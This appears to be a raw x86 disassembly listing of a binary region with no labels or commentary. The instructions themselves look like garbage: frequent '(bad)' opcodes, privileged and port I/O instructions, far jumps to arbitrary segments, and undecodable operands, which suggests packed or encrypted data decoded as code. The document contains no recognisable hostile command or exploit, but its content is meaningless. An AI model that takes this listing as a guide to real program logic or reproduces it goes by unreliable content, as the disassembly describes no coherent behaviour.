  41c1fd:	fst    DWORD PTR [edx]
  41c1ff:	dec    eax
  41c200:	(bad)  
  41c202:	inc    esp
  41c203:	and    bl,BYTE PTR [ebx-0x62]
  41c206:	ds dec edx
  41c208:	dec    esi
  41c209:	pop    ds
  41c20a:	cs sub al,al
  41c20d:	adc    DWORD PTR [edx*2+0x68c9f7fe],ebp
  41c214:	add    al,0x7c
  41c216:	lods   al,BYTE PTR ds:[esi]
  41c217:	xchg   BYTE PTR [ebx+0x78],dh
  41c21a:	jmp    0x41c241
  41c21c:	sub    eax,0x7d9d38d6
  41c221:	pushf  
  41c222:	in     eax,dx
  41c223:	sub    BYTE PTR ds:0xb3a010f4,ah
  41c229:	or     edx,DWORD PTR [edx+0x5c]
  41c22c:	inc    eax
  41c22d:	dec    ecx
  41c22e:	sti    
  41c22f:	(bad)  
  41c230:	push   eax
  41c231:	daa    
  41c232:	test   cl,ah
  41c234:	imul   DWORD PTR [edx]
  41c236:	leave  
  41c237:	mov    esi,DWORD PTR [edx+eax*1-0x2c3f9924]
  41c23e:	inc    edx
  41c23f:	call   0x358e:0x3d63b247
  41c246:	(bad)  
  41c247:	cdq    
  41c248:	jno    0x41c262
  41c24a:	imul   BYTE PTR [ebx+0x4ca0b396]
  41c250:	call   0xac1:0x828a12a
  41c257:	dec    ebp
  41c258:	pop    edi
  41c259:	outs   dx,BYTE PTR ds:[esi]
  41c25a:	jnp    0x41c277
  41c25c:	jmp    0x6d1e:0x4b35a8e8
  41c263:	loopne 0x41c272
  41c265:	add    eax,0xb73170a3
  41c26a:	fisub  DWORD PTR [ebp-0x6e004bc0]
  41c270:	sahf   
  41c271:	ds sbb eax,0xc44e9d61
  41c277:	(bad)  
  41c278:	aaa    
  41c279:	lods   eax,DWORD PTR ds:[esi]
  41c27a:	into   
  41c27b:	jle    0x41c210
  41c27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c27e:	out    0xde,al
  41c280:	jmp    FWORD PTR [ebx+ebp*1]
  41c283:	xchg   ah,al
  41c285:	sbb    al,0x32
  41c287:	push   ebx
  41c288:	mov    edx,0x91dae963
  41c28d:	jmp    0x3a8e:0x66ae638b
  41c294:	nop
  41c295:	mov    ch,0x4f
  41c297:	sub    eax,0xa97772d4
  41c29c:	xor    al,0x60
  41c29e:	or     esi,DWORD PTR [ecx+0x28b3d056]
  41c2a4:	mov    ch,0x55
  41c2a6:	mov    bl,0x94
  41c2a8:	out    0x48,al
  41c2aa:	dec    DWORD PTR [edi+0x7a02a101]
  41c2b0:	mov    edx,0xd9f376a9
  41c2b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2b6:	arpl   WORD PTR [ebp+0x458bf9e4],cx
  41c2bc:	cmp    ah,cl
  41c2be:	push   eax
  41c2bf:	and    eax,0x427d0942
  41c2c4:	or     eax,0x31683389
  41c2c9:	jmp    0x41c2d4
  41c2cb:	in     al,dx
  41c2cc:	xchg   ebx,eax
  41c2cd:	pop    edi
  41c2ce:	sub    eax,edi
  41c2d0:	rcr    DWORD PTR [eax],1
  41c2d2:	ds sbb al,ah
  41c2d5:	leave  
  41c2d6:	div    BYTE PTR [esi]
  41c2d8:	pop    ecx
  41c2d9:	stos   DWORD PTR es:[edi],eax
  41c2da:	fs inc ecx
  41c2dc:	dec    DWORD PTR [edi+edi*2]
  41c2df:	dec    edx
  41c2e0:	je     0x41c33a
  41c2e2:	int    0x39
  41c2e4:	pop    esp
  41c2e5:	jb     0x41c295
  41c2e7:	cmp    BYTE PTR [ebp+0x19],0xfe
  41c2eb:	mov    edx,0x45460077
  41c2f0:	stos   BYTE PTR es:[edi],al
  41c2f1:	(bad)  
  41c2f2:	loopne 0x41c289
  41c2f4:	(bad)  [eax]
  41c2f6:	sahf   
  41c2f7:	outs   dx,BYTE PTR ds:[esi]
  41c2f8:	(bad)  
  41c2f9:	(bad)  
  41c2fa:	mov    dl,0xf
  41c2fc:	cmc    
  41c2fd:	jb     0x2303f000
  41c303:	(bad)  
  41c305:	dec    ecx
  41c306:	hlt    
  41c307:	sbb    bl,BYTE PTR [ebx]
  41c309:	sbb    edi,eax
  41c30b:	sbb    edi,DWORD PTR [edi+0x65]
  41c30e:	jmp    0x41c2b1
  41c310:	imul   esp,DWORD PTR [ecx-0x75],0xd75c2ec1
  41c317:	clc    
  41c318:	popf   
  41c319:	xlat   BYTE PTR ds:[ebx]
  41c31a:	push   cs
  41c31b:	xchg   ebp,eax
  41c31c:	int    0x1d
  41c31e:	fsub   DWORD PTR [edi]
  41c320:	cwde   
  41c321:	into   
  41c322:	rcl    DWORD PTR [esi+0x4d6686d3],cl
  41c328:	scas   al,BYTE PTR es:[edi]
  41c329:	or     eax,0xc07a5f5f
  41c32e:	mov    cl,0xc6
  41c330:	xchg   edx,eax
  41c331:	xchg   edx,eax
  41c332:	test   DWORD PTR [edi+0x1a],edx
  41c335:	idiv   esp
  41c337:	fcmovnu st,st(3)
  41c339:	(bad)  
  41c33a:	xor    al,0xfa
  41c33c:	mov    al,0x68
  41c33e:	stos   BYTE PTR es:[edi],al
  41c33f:	mov    esp,DWORD PTR [ebp-0x4bf9af21]
  41c345:	fbld   TBYTE PTR [ecx+0x71c1ed5d]
  41c34b:	fdivr  st(5),st
  41c34d:	das    
  41c34e:	jb     0x41c333
  41c350:	(bad)  [esi+ebp*2+0x7]
  41c354:	push   es
  41c355:	call   0x6b370c09
  41c35a:	into   
  41c35b:	pop    edx
  41c35c:	mov    ch,0xe6
  41c35e:	or     DWORD PTR [ebx+0x17f3e3de],esi
  41c364:	cdq    
  41c365:	aaa    
  41c366:	xchg   edi,eax
  41c367:	inc    edi
  41c368:	adc    BYTE PTR [ecx+ebp*2+0x39dfeb71],0x1f
  41c370:	mov    ds:0xb64d4e2,eax
  41c375:	push   0x5b
  41c377:	mov    ch,0xdc
  41c379:	cmp    BYTE PTR ds:0xb6fa29f6,ah
  41c37f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c380:	push   cs
  41c381:	cmp    al,0x26
  41c383:	push   ds
  41c384:	mov    esi,DWORD PTR [edx+ecx*1+0x69ca0e3c]
  41c38b:	ret    
  41c38c:	fmul   st(2),st
  41c38e:	je     0x41c363
  41c390:	jg     0xd71021d
  41c396:	sbb    al,0xfb
  41c398:	push   ss
  41c399:	push   0xffffff9a
  41c39b:	adc    al,0x21
  41c39d:	out    dx,eax
  41c39e:	mov    ebx,0xc1bddae9
  41c3a3:	les    edi,FWORD PTR [ebp-0x48]
  41c3a6:	or     DWORD PTR [esi+0x55],edi
  41c3a9:	mov    ebp,0x4158f7fe
  41c3ae:	cld    
  41c3af:	fwait
  41c3b0:	std    
  41c3b1:	xor    eax,0xb42fde9a
  41c3b6:	and    BYTE PTR [ebp+0x6c],dl
  41c3b9:	and    DWORD PTR [edx+0xf2ce806],ebp
  41c3bf:	mov    dh,0x4e
  41c3c1:	push   cs
  41c3c2:	xor    ebx,DWORD PTR [edx+0x1f666a8f]
  41c3c8:	ins    BYTE PTR es:[edi],dx
  41c3c9:	aam    0x3f
  41c3cb:	or     ah,BYTE PTR [edx+0x37]
  41c3ce:	xchg   ecx,eax
  41c3cf:	scas   eax,DWORD PTR es:[edi]
  41c3d0:	mov    ebp,ecx
  41c3d2:	fadd   DWORD PTR [ebx+0x2b]
  41c3d5:	add    BYTE PTR [edx+esi*4],ah
  41c3d8:	inc    eax
  41c3d9:	sbb    bh,dl
  41c3db:	mov    ch,0x44
  41c3dd:	pop    ss
  41c3de:	fdivr  DWORD PTR cs:[ecx+0x5776ad62]
  41c3e5:	add    ebx,ebx
  41c3e7:	pop    ds
  41c3e8:	ret    0x78cf
  41c3eb:	popf   
  41c3ec:	push   ebp
  41c3ed:	xor    BYTE PTR [edx-0x55],bh
  41c3f0:	int3   
  41c3f1:	xchg   edx,eax
  41c3f2:	stos   BYTE PTR es:[edi],al
  41c3f3:	shl    DWORD PTR [edi+0x3c],cl
  41c3f6:	jl     0x41c3e1
  41c3f8:	std    
  41c3f9:	mov    edx,0xb257879e
  41c3fe:	ja     0x41c384
  41c400:	and    ecx,esi
  41c402:	sub    ch,dh
  41c404:	sub    dh,bl
  41c406:	aas    
  41c407:	repnz adc dl,dl
  41c40a:	(bad)  
  41c40c:	add    DWORD PTR [ecx],edi
  41c40e:	pushf  
  41c40f:	mov    eax,0x632820f3
  41c414:	xchg   DWORD PTR [ebp+esi*1+0x17],esi
  41c418:	in     eax,dx
  41c419:	push   esp
  41c41a:	mov    edx,0xe6cbb772
  41c41f:	daa    
  41c420:	xor    cl,BYTE PTR [ebp+0x6f]
  41c423:	or     dl,BYTE PTR [esp+ebx*4-0x74bbb4b2]
  41c42a:	aam    0x6c
  41c42c:	test   al,0x65
  41c42e:	xor    DWORD PTR ds:[ebp-0x51],edx
  41c432:	push   ebp
  41c433:	pop    ecx
  41c434:	pop    edx
  41c435:	cli    
  41c436:	xchg   DWORD PTR [ebp+0x2c],ebp
  41c439:	xor    eax,0x22744169
  41c43e:	fstp   QWORD PTR [ecx+0x30872936]
  41c444:	nop
  41c445:	sbb    dh,BYTE PTR [edi+0x1209fa1e]
  41c44b:	xchg   esi,eax
  41c44c:	cmp    BYTE PTR [edx],bh
  41c44e:	inc    ecx
  41c44f:	or     BYTE PTR [ecx],0xad
  41c452:	clc    
  41c453:	ins    BYTE PTR es:[edi],dx
  41c454:	loope  0x41c46f
  41c456:	leave  
  41c457:	popa   
  41c458:	pop    ds
  41c459:	sub    eax,0x11935734
  41c45e:	inc    eax
  41c45f:	inc    esi
  41c460:	xor    esi,ebx
  41c462:	std    
  41c463:	add    eax,0x431f282b
  41c468:	fdiv   st(1),st
  41c46a:	or     al,0xd3
  41c46c:	loopne 0x41c48a
  41c46e:	jle    0x41c4a5
  41c470:	imul   esp,eax,0xffffff84
  41c473:	xor    DWORD PTR [ebp+ebp*8-0x63],0xf9060a76
  41c47b:	icebp  
  41c47c:	mov    ch,0x32
  41c47e:	adc    eax,0xe7bdc8fe
  41c483:	pop    edi
  41c484:	imul   DWORD PTR [eax+0x49f4cea5]
  41c48a:	adc    eax,0xc9ba837b
  41c48f:	inc    ebp
  41c490:	cmp    ecx,DWORD PTR [eax+0x7a55f819]
  41c496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c497:	cmp    esi,ebp
  41c499:	sbb    edi,edi
  41c49b:	sahf   
  41c49c:	xchg   ecx,eax
  41c49d:	dec    eax
  41c49e:	out    dx,al
  41c49f:	adc    al,0x76
  41c4a2:	xchg   ebx,eax
  41c4a3:	mov    BYTE PTR [ecx],dh
  41c4a5:	clc    
  41c4a6:	pusha  
  41c4a7:	(bad)
  41c4aa:	jb     0x41c528
  41c4ac:	lods   al,BYTE PTR ds:[esi]
  41c4ad:	mov    BYTE PTR [edx],cl
  41c4af:	gs jl  0x41c516
  41c4b2:	aaa    
  41c4b3:	cmp    ch,BYTE PTR ss:[esi+esi*8+0xfa67335]
  41c4bb:	stos   DWORD PTR es:[edi],eax
  41c4bc:	or     al,0x4f
  41c4be:	dec    eax
  41c4bf:	inc    edx
  41c4c0:	es xchg ebp,eax
  41c4c2:	enter  0xa35f,0x28
  41c4c6:	int    0xf6
  41c4c8:	mov    ebx,0x3bae350b
  41c4cd:	bound  edx,QWORD PTR [ecx+0x2c118e6f]
  41c4d3:	mov    ebp,0x8b738ac4
  41c4d8:	cmove  esi,DWORD PTR [esi+0x4a]
  41c4dc:	fwait
  41c4dd:	xchg   esp,esp
  41c4df:	lods   eax,DWORD PTR ds:[esi]
  41c4e0:	dec    edi
  41c4e1:	push   edi
  41c4e2:	popf   
  41c4e3:	shl    DWORD PTR [ecx],1
  41c4e5:	dec    edx
  41c4e6:	sub    al,0xc7
  41c4e9:	(bad)  
  41c4ea:	in     al,dx
  41c4eb:	push   eax
  41c4ec:	and    al,0x5c
  41c4ee:	mov    esp,DWORD PTR ds:0x19b35e51
  41c4f4:	scas   eax,DWORD PTR es:[edi]
  41c4f5:	xchg   DWORD PTR [ecx],esi
  41c4f7:	mov    ebp,0x8f09f9c8
  41c4fc:	loopne 0x41c556
  41c4fe:	xchg   edx,eax
  41c4ff:	inc    esp
  41c500:	mov    edx,0xee68fc75
  41c505:	ror    WORD PTR ss:[edx],0x55
  41c50a:	mov    dh,0x40
  41c50c:	pop    ss
  41c50d:	fsub   DWORD PTR [ebx-0x4f]
  41c510:	push   ds
  41c511:	mov    ah,0x9b
  41c513:	loopne 0x41c56f
  41c515:	neg    BYTE PTR [esi-0x5bf6e21c]
  41c51b:	jmp    0x41c4d3
  41c51d:	mov    ebp,0xacc9f534
  41c522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c523:	xor    esi,ecx
  41c525:	ins    BYTE PTR es:[edi],dx
  41c526:	repz cli 
  41c528:	jge    0x41c533
  41c52a:	adc    DWORD PTR [edx-0x470dec21],esi
  41c530:	or     bh,BYTE PTR [eax]
  41c532:	adc    ebx,edx
  41c534:	dec    eax
  41c535:	or     al,0xe9
  41c537:	xchg   esp,eax
  41c538:	mov    edi,cs
  41c53a:	ret    
  41c53b:	push   es
  41c53c:	lods   eax,DWORD PTR ds:[esi]
  41c53d:	or     al,0x76
  41c53f:	in     al,0x6f
  41c541:	xor    al,0x15
  41c543:	dec    esp
  41c544:	push   0xffffffe2
  41c546:	and    DWORD PTR [ebx-0xa],ecx
  41c549:	pop    edx
  41c54a:	or     BYTE PTR [edi-0x40],bh
  41c54d:	jmp    0x41c55e
  41c54f:	into   
  41c550:	push   edi
  41c551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c552:	mov    al,0x99
  41c554:	xor    dh,BYTE PTR [esi]
  41c556:	fisub  DWORD PTR [ebx-0x77]
  41c559:	sbb    bh,BYTE PTR [edx]
  41c55b:	ins    BYTE PTR es:[edi],dx
  41c55c:	inc    edx
  41c55d:	jmp    0xf850:0x3417be89
  41c564:	sub    ah,BYTE PTR [esi+0x35]
  41c567:	addr16 mov ch,0xb3
  41c56a:	aaa    
  41c56b:	icebp  
  41c56c:	fwait
  41c56d:	stos   BYTE PTR es:[edi],al
  41c56e:	pop    esi
  41c56f:	(bad)  
  41c570:	fucomp st(1)
  41c572:	cdq    
  41c573:	xor    eax,0x60d96632
  41c578:	fdiv   DWORD PTR [ecx]
  41c57a:	cmp    BYTE PTR [ebx+ecx*4-0x7294c546],0x81
  41c582:	mov    edx,0x5cd4e5cc
  41c587:	aas    
  41c588:	or     ebp,ebp
  41c58a:	pop    edi
  41c58b:	mov    edx,0x39bff656
  41c590:	pop    ebx
  41c591:	and    al,0x48
  41c593:	lock stc 
  41c595:	fild   DWORD PTR [ebx+edx*2]
  41c598:	or     ebp,esi
  41c59a:	sub    DWORD PTR [ebx+ebp*8+0x537f5b9],eax
  41c5a1:	xchg   esi,eax
  41c5a2:	je     0x41c5da
  41c5a4:	pusha  
  41c5a5:	add    BYTE PTR [ebx],ah
  41c5a7:	jp     0x41c5fe
  41c5a9:	add    cl,dl
  41c5ab:	call   DWORD PTR ds:0x46b10430
  41c5b1:	bound  ebx,QWORD PTR [esi+esi*8]
  41c5b4:	cmp    al,cl
  41c5b6:	(bad)  
  41c5b8:	mov    cl,BYTE PTR [ebx-0x22]
  41c5bb:	add    DWORD PTR [edx-0x45],ecx
  41c5be:	jne    0x41c547
  41c5c0:	push   DWORD PTR [eax+edi*2-0x494503a2]
  41c5c7:	push   ebp
  41c5c8:	imul   esp,DWORD PTR [ebx-0x37],0xffffffb8
  41c5cc:	ret    
  41c5cd:	adc    bl,ah
  41c5cf:	inc    esi
  41c5d0:	mov    edx,DWORD PTR [edi+esi*2]
  41c5d3:	pop    eax
  41c5d4:	xor    edi,DWORD PTR [ecx]
  41c5d6:	test   ch,bh
  41c5d8:	in     eax,0x5c
  41c5da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5db:	mov    esp,0xc00fddcd
  41c5e0:	cs out dx,al
  41c5e2:	idiv   BYTE PTR [ecx-0x74fa1291]
  41c5e8:	loopne 0x41c5d1
  41c5ea:	shl    ah,cl
  41c5ec:	cmp    dh,ch
  41c5ee:	(bad)  [ebp-0x1bd7c0d6]
  41c5f4:	pmovmskb esp,mm3
  41c5f7:	shl    BYTE PTR [esi-0xe991277],1
  41c5fd:	push   eax
  41c5fe:	cs push edx
  41c600:	out    dx,eax
  41c601:	push   es
  41c602:	or     ecx,DWORD PTR [esi+0x2bc1b360]
  41c608:	fwait
  41c609:	in     eax,0x6c
  41c60b:	xchg   esp,eax
  41c60c:	call   0xecd06bf5
  41c611:	out    0x0,al
  41c613:	(bad)
  41c616:	xor    eax,0xfc684dd4
  41c61b:	(bad)
  41c61f:	push   edx
  41c620:	scas   al,BYTE PTR es:[edi]
  41c621:	push   ebp
  41c622:	loope  0x41c673
  41c624:	adc    BYTE PTR [edi+0x30c149f2],dl
  41c62a:	and    BYTE PTR [ecx],dh
  41c62c:	add    ch,dl
  41c62e:	or     al,0x2a
  41c630:	aaa    
  41c631:	sbb    eax,0xe73cc435
  41c636:	mov    edx,cs
  41c638:	arpl   WORD PTR [ebx+0x62],cx
  41c63b:	pushf  
  41c63c:	fbstp  TBYTE PTR [edi+0x401404d2]
  41c642:	mov    ds:0xe9cf2415,eax
  41c647:	adc    dh,cl
  41c649:	lods   eax,DWORD PTR ds:[esi]
  41c64a:	ja     0x41c664
  41c64c:	inc    edi
  41c64d:	and    BYTE PTR [ebx-0x20],cl
  41c650:	or     esp,DWORD PTR [eax]
  41c652:	dec    edx
  41c653:	stos   DWORD PTR es:[edi],eax
  41c654:	sub    al,0xb4
  41c656:	pusha  
  41c657:	mov    ds,WORD PTR [edx]
  41c659:	or     ah,BYTE PTR [edi+eiz*4+0x6d3ac5ec]
  41c660:	ret    0x7afb
  41c663:	scas   eax,DWORD PTR es:[edi]
  41c664:	cmp    eax,0xffffffc7
  41c667:	(bad)  
  41c668:	ss mov ch,0x55
  41c66b:	sub    BYTE PTR [esi],dh
  41c66d:	repz sbb ch,BYTE PTR [eax]
  41c670:	in     al,dx
  41c671:	mov    ch,0x41
  41c673:	rcr    BYTE PTR [ecx-0x4e6f563e],cl
  41c679:	jmp    0x4fd47077
  41c67e:	jle    0x41c699
  41c680:	gs out 0x40,al
  41c683:	push   esp
  41c684:	sar    BYTE PTR [edi-0x5fabd95f],cl
  41c68a:	push   0x5017c0bf
  41c68f:	les    ebx,FWORD PTR [ebx-0x38e4c6af]
  41c695:	push   eax
  41c696:	pusha  
  41c697:	movzx  esi,BYTE PTR [eax+ebp*4+0x6e7489b]
  41c69f:	mov    edi,0xb10fc605
  41c6a4:	shl    BYTE PTR [ecx+0x47],1
  41c6a7:	or     ecx,DWORD PTR [ecx-0x4b8b22a4]
  41c6ad:	jg     0x41c683
  41c6af:	leave  
  41c6b0:	xor    BYTE PTR [edx+0x2d],0xc
  41c6b4:	push   edi
  41c6b5:	ins    DWORD PTR es:[edi],dx
  41c6b6:	push   esp
  41c6b7:	pusha  
  41c6b8:	lods   eax,DWORD PTR ds:[esi]
  41c6b9:	imul   esi,DWORD PTR [ebp-0x13],0x31
  41c6bd:	adc    esi,DWORD PTR [esi]
  41c6bf:	inc    eax
  41c6c0:	ins    BYTE PTR es:[edi],dx
  41c6c1:	or     bl,ch
  41c6c3:	inc    eax
  41c6c4:	cmp    DWORD PTR [eax+0x36afe39a],ecx
  41c6ca:	jmp    0x5c55205
  41c6cf:	int3   
  41c6d0:	cmp    eax,0xd3ba2589
  41c6d5:	icebp  
  41c6d6:	cmp    eax,0x40892fa0
  41c6db:	(bad)  
  41c6dc:	ror    DWORD PTR [esi-0x4b2109ff],1
  41c6e2:	and    BYTE PTR [ecx-0x288ad51d],0x9d
  41c6e9:	mov    esi,0xbc0c62d
  41c6ee:	mov    ds:0x5a608837,al
  41c6f3:	cmp    DWORD PTR [ecx-0x31a2ae34],esi
  41c6f9:	pop    ds
  41c6fa:	daa    
  41c6fb:	retf   
  41c6fc:	inc    edi
  41c6fe:	hlt    
  41c6ff:	arpl   WORD PTR [edi-0x65857d3b],sp
  41c705:	out    dx,eax
  41c706:	and    al,0x54
  41c708:	mov    BYTE PTR [ebx],bl
  41c70a:	cld    
  41c70b:	lahf   
  41c70c:	jge    0x41c754
  41c70e:	fnsave [ebx]
  41c710:	cmp    eax,0x9657cb96
  41c715:	lock fild WORD PTR [edi+0x1f]
  41c719:	imul   esp,DWORD PTR [edx+0x25],0x57
  41c71d:	imul   ecx,DWORD PTR [edi+0x15],0xffffffba
  41c721:	retf   0xe9aa
  41c724:	rcl    eax,cl
  41c726:	outs   dx,BYTE PTR ds:[esi]
  41c727:	ja     0x41c742
  41c729:	sub    esp,esp
  41c72b:	sbb    eax,0xe4a86a16
  41c730:	enter  0x8126,0x9
  41c734:	fiadd  WORD PTR [ebx+ebx*2+0x737b4e10]
  41c73b:	jmp    0x41c6e0
  41c73d:	fistp  DWORD PTR [eax+eax*1]
  41c740:	sbb    al,0xb9
  41c742:	adc    BYTE PTR [eax+0x5fad067],al
  41c748:	or     BYTE PTR [edi+0x6cf70a89],bh
  41c74e:	fdivr  DWORD PTR [ecx]
  41c750:	(bad)  
  41c751:	out    dx,eax
  41c752:	push   0x43
  41c754:	cmp    edi,DWORD PTR [edx+0x8]
  41c757:	dec    edi
  41c758:	push   eax
  41c759:	das    
  41c75a:	rdmsr  
  41c75c:	pushf  
  41c75d:	xchg   ch,bl
  41c75f:	repnz pop esi
  41c761:	in     eax,0x8e
  41c763:	ins    BYTE PTR es:[edi],dx
  41c764:	popf   
  41c765:	or     al,ah
  41c767:	bnd jge 0x41c7b6
  41c76a:	push   ss
  41c76b:	imul   edi
  41c76d:	cli    
  41c76e:	adc    BYTE PTR [esi-0x1b],bl
  41c771:	adc    DWORD PTR [ebx+edx*2],eax
  41c774:	jns    0x41c76f
  41c776:	inc    esp
  41c777:	out    dx,al
  41c778:	push   edi
  41c779:	in     eax,dx
  41c77a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c77b:	ss push esi
  41c77d:	sub    BYTE PTR [esi-0x5b],ah
  41c780:	adc    DWORD PTR [ebx],ecx
  41c782:	rol    BYTE PTR [ecx-0x552afea4],0xfe
  41c789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c78a:	cli    
  41c78b:	mov    ?,WORD PTR [ecx-0x1a]
  41c78e:	lock and eax,0x183f2304
  41c794:	pop    ss
  41c795:	adc    esp,DWORD PTR [eax]
  41c797:	cli    
  41c798:	inc    eax
  41c799:	mov    DWORD PTR [ebx+0x32],ecx
  41c79c:	jae    0x41c781
  41c79e:	mov    ebx,0x9cb049a9
  41c7a3:	cmp    dl,ch
  41c7a5:	(bad)  
  41c7a6:	call   0xbbef1f92
  41c7ab:	xor    BYTE PTR [ebx+0x37e89921],ah
  41c7b1:	out    dx,al
  41c7b2:	mov    dh,BYTE PTR [ebp+0x5d]
  41c7b5:	neg    DWORD PTR [ebp+0xd]
  41c7b8:	push   ebp
  41c7b9:	inc    ecx
  41c7ba:	xchg   ebp,eax
  41c7bb:	cmp    ebx,esp
  41c7bd:	ror    BYTE PTR [ebx],cl
  41c7bf:	inc    edx
  41c7c0:	lock xor BYTE PTR [edx+0x74],dl
  41c7c4:	or     DWORD PTR [ebx+0x2a],ebp
  41c7c7:	stos   DWORD PTR es:[edi],eax
  41c7c8:	lods   al,BYTE PTR ds:[esi]
  41c7c9:	leave  
  41c7ca:	jo     0x41c768
  41c7cc:	enter  0x9f2e,0x65
  41c7d0:	lods   eax,DWORD PTR ds:[esi]
  41c7d1:	cld    
  41c7d2:	mov    edx,0x2e2cc544
  41c7d7:	mov    ebp,0x93c7eaec
  41c7dc:	inc    edx
  41c7dd:	jmpw   0x85ae
  41c7e1:	lods   al,BYTE PTR ds:[esi]
  41c7e2:	push   esi
  41c7e3:	leave  
  41c7e4:	cmp    al,0x73
  41c7e6:	xchg   ecx,eax
  41c7e7:	enter  0x4e07,0x99
  41c7eb:	fsubr  QWORD PTR [ebp-0x58]
  41c7ee:	out    0x7f,eax
  41c7f0:	in     eax,0x6e
  41c7f2:	and    edx,0xd5259b29
  41c7f8:	pop    edx
  41c7f9:	pusha  
  41c7fa:	ins    BYTE PTR es:[edi],dx
  41c7fb:	jg     0x9e39a5d0
  41c801:	bound  ebp,QWORD PTR [edi]
  41c803:	jbe    0x41c833
  41c805:	add    ecx,ebp
  41c807:	js     0x41c7ee
  41c809:	shl    BYTE PTR [ebp+0x4ef4c08c],cl
  41c80f:	inc    ebp
  41c810:	outs   dx,BYTE PTR ds:[esi]
  41c811:	pusha  
  41c812:	xor    DWORD PTR [ebp+0x5d],edi
  41c815:	and    BYTE PTR [edx+0x34],dh
  41c818:	imul   ebp,DWORD PTR [ebx-0x3c388295],0x6c
  41c81f:	sub    al,0xd
  41c821:	ins    BYTE PTR es:[edi],dx
  41c822:	ret    0xd56c
  41c825:	scas   eax,DWORD PTR es:[edi]
  41c826:	ret    0xcdb
  41c829:	daa    
  41c82a:	sbb    al,0xc1
  41c82c:	daa    
  41c82d:	outs   dx,DWORD PTR ds:[esi]
  41c82e:	gs mov bh,0xe1
  41c831:	shl    DWORD PTR [edi+0x73],1
  41c834:	pushf  
  41c835:	lds    eax,FWORD PTR [edx-0x585e721a]
  41c83b:	mov    BYTE PTR ds:0x6242dd62,ah
  41c841:	push   cs
  41c842:	xchg   esi,eax
  41c843:	push   cs
  41c844:	les    eax,FWORD PTR [edx-0x62]
  41c847:	pop    esp
  41c848:	aad    0xa2
  41c84a:	xchg   ebp,eax
  41c84b:	push   0xeb94d180
  41c850:	and    ebp,ebp
  41c852:	sub    BYTE PTR [eax+eiz*2+0x5d],cl
  41c856:	cmp    cl,BYTE PTR [ecx-0x53ff9ab4]
  41c85c:	mov    eax,ds:0x8c18b3c4
  41c861:	inc    ebp
  41c862:	sbb    al,0x1b
  41c864:	adc    bl,dh
  41c866:	aad    0x82
  41c868:	inc    edi
  41c869:	jmp    0x3d6ea577
  41c86e:	sub    BYTE PTR [esi],bh
  41c870:	stos   DWORD PTR es:[edi],eax
  41c871:	in     eax,dx
  41c872:	add    ch,BYTE PTR [edi+0x7b5a0193]
  41c878:	in     eax,dx
  41c879:	add    BYTE PTR [esi+0x28],0x19
  41c87d:	inc    esp
  41c87e:	sub    al,0x70
  41c880:	xor    DWORD PTR [edi-0x75d22ca3],ecx
  41c886:	xchg   BYTE PTR [ecx-0x75d9711b],al
  41c88c:	or     DWORD PTR [edi],edx
  41c88e:	cld    
  41c88f:	jno    0x41c90a
  41c891:	push   ds
  41c892:	es jae 0x41c88e
  41c895:	or     BYTE PTR [ebp+0x19fa67f6],dh
  41c89b:	pop    es
  41c89c:	xor    DWORD PTR [ecx],ebp
  41c89e:	and    eax,0x77b17aa0
  41c8a3:	cwde   
  41c8a4:	cmp    bl,bl
  41c8a6:	sti    
  41c8a7:	test   DWORD PTR [eax],edx
  41c8a9:	and    cl,BYTE PTR [ebp-0x51]
  41c8ac:	cmp    al,0xfd
  41c8ae:	inc    esp
  41c8af:	popa   
  41c8b0:	cmp    BYTE PTR [ecx+0x4b],al
  41c8b3:	push   ebx
  41c8b4:	lods   eax,DWORD PTR ds:[esi]
  41c8b5:	mov    ah,BYTE PTR [eax+eax*1-0x58b42fc0]
  41c8bc:	jmp    0x93e5b091
  41c8c1:	(bad)  
  41c8c2:	jmp    FWORD PTR [edx]
  41c8c4:	adc    DWORD PTR [ebp-0x5c],ebx
  41c8c7:	les    ebp,FWORD PTR [ecx]
  41c8c9:	mov    eax,0x24ad2218
  41c8ce:	and    al,0x3c
  41c8d0:	pop    ds
  41c8d1:	and    al,0x6a
  41c8d3:	rol    DWORD PTR [edi],1
  41c8d5:	push   0x8dcf1a4e
  41c8da:	xchg   ebx,eax
  41c8db:	call   0xbea4:0x187af507
  41c8e2:	rep lods eax,DWORD PTR ds:[esi]
  41c8e4:	dec    esi
  41c8e5:	gs out dx,eax
  41c8e7:	mov    eax,0x704c2cb5
  41c8ec:	pop    ds
  41c8ed:	mov    WORD PTR [edx-0x22],?
  41c8f0:	fistp  DWORD PTR [eax-0x36f90985]
  41c8f6:	jae    0x41c927
  41c8f8:	and    DWORD PTR [ecx+0x303819b5],esp
  41c8fe:	mov    ecx,0x328a885c
  41c903:	je     0x41c8f6
  41c905:	aaa    
  41c906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c907:	jecxz  0x41c8d6
  41c909:	es and ebp,eax
  41c90c:	fiadd  DWORD PTR [edi-0x57]
  41c90f:	dec    esp
  41c910:	xchg   esp,eax
  41c911:	mov    dl,0xa
  41c914:	out    0x66,eax
  41c916:	int    0x8a
  41c918:	push   ds
  41c919:	dec    eax
  41c91a:	lods   al,BYTE PTR ds:[esi]
  41c91b:	loopne 0x41c94e
  41c91d:	mov    BYTE PTR [esi+0x75],al
  41c920:	cwde   
  41c921:	stc    
  41c922:	mov    ebp,0x1d5ce55
  41c927:	cmp    eax,0xd5b137d6
  41c92c:	fild   QWORD PTR [ebx-0xb469939]
  41c932:	ja     0x41c91d
  41c934:	jge    0x41c919
  41c936:	sub    DWORD PTR [eax+0x79],ecx
  41c939:	pop    ecx
  41c93a:	imul   ebp,DWORD PTR es:[edx+0x74ca3eae],0x261dff10
  41c945:	cmp    DWORD PTR [edx+0x1295221e],edx
  41c94b:	mov    ebx,0x367daef7
  41c950:	xlat   BYTE PTR ds:[ebx]
  41c951:	mov    dh,0x77
  41c953:	pop    eax
  41c954:	and    BYTE PTR ds:0xf4fee20c,ah
  41c95a:	and    DWORD PTR [ebp-0x839c39],0xa908c2f2
  41c964:	sar    BYTE PTR [edi-0x4b7ecdde],1
